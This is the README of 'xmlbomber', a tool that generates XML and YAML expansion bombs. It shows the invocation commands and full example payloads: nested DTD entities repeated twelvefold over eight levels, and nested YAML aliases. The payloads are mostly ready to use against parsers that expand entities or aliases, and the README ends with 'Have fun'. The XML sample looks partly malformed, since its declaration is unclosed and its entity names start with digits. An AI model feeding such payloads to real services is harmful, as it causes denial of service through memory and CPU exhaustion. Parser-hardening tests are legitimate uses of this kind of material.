***

<h1 align="center">
	<b>xmlbomber</b>
</h1>
<h3 align="center">
	<i>script to create a XML or YAML bomb</i>
</h3>

Example:  
``` 
$ xmlbomber.py -e 7 -r 12 -n "hi" -c "boom" xml
```
```xml
<?xml version="1.0">
<!DOCTYPE hi [
  <!ENTITY 0 "boom">
  <!ENTITY 1 "&0; &0; &0; &0; &0; &0; &0; &0; &0; &0; &0; &0">
  <!ENTITY 2 "&1; &1; &1; &1; &1; &1; &1; &1; &1; &1; &1; &1">
  <!ENTITY 3 "&2; &2; &2; &2; &2; &2; &2; &2; &2; &2; &2; &2">
  <!ENTITY 4 "&3; &3; &3; &3; &3; &3; &3; &3; &3; &3; &3; &3">
  <!ENTITY 5 "&4; &4; &4; &4; &4; &4; &4; &4; &4; &4; &4; &4">
  <!ENTITY 6 "&5; &5; &5; &5; &5; &5; &5; &5; &5; &5; &5; &5">
  <!ENTITY 7 "&6; &6; &6; &6; &6; &6; &6; &6; &6; &6; &6; &6">
  <!ENTITY start "&7;">
]>
<hi>&start;</hi>
```
***
```
$ xmlbomber.py -e 5 -r 7 -c "boom" yaml
```
```yaml
0: &0 ["boom", "boom", "boom", "boom", "boom", "boom", "boom"]
1: &1 [*0, *0, *0, *0, *0, *0, *0]
2: &2 [*1, *1, *1, *1, *1, *1, *1]
3: &3 [*2, *2, *2, *2, *2, *2, *2]
4: &4 [*3, *3, *3, *3, *3, *3, *3]
5: &5 [*4, *4, *4, *4, *4, *4, *4]

```

### Have fun